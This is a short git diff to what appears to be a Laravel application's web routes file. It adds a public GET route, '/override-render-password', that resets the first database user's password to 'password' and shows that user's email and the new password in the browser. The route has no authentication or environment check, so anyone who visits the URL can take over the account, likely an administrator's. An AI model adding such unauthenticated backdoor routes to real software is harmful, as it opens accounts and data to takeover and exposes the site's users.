@@ -52,3 +52,13 @@ Route::middleware(['web', 'company.identify'])->group(function () {
         require base_path('modules/OmniChat/Routes/webhook.php');
     }
 });
+
+Route::get('/override-render-password', function () {
+    $user = \App\Models\Auth\User::first();
+    if ($user) {
+        $user->password = \Illuminate\Support\Facades\Hash::make('password');
+        $user->save();
+        return "Password successfully reset for: " . $user->email . "<br>New Password: password<br><a href='/auth/login'>Go to Login</a>";
+    }
+    return "No users found in database.";
+});
